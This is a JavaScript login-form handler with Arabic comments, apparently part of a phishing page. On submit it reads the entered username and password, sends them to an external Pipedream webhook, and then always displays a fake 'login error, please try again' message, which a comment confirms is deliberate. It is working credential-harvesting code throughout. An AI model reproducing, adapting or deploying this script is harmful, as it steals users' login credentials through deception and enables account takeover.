document.getElementById('loginForm').addEventListener('submit', async function(event) {
    event.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    // بيانات النموذج
    const formData = {
        username: username,
        password: password
    };
    
    try {
        // إرسال البيانات إلى Pipedream
        const response = await fetch('https://eo6k9lhsvqw5x2y.m.pipedream.net', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(formData)
        });
        
        // عرض رسالة خطأ دائمًا
        document.getElementById('message').textContent = "حدث خطأ أثناء تسجيل الدخول. يرجى المحاولة مرة أخرى.";
        document.getElementById('message').style.color = "red";
    } catch (error) {
        document.getElementById('message').textContent = "حدث خطأ في الاتصال بالخادم.";
        document.getElementById('message').style.color = "red";
    }
});

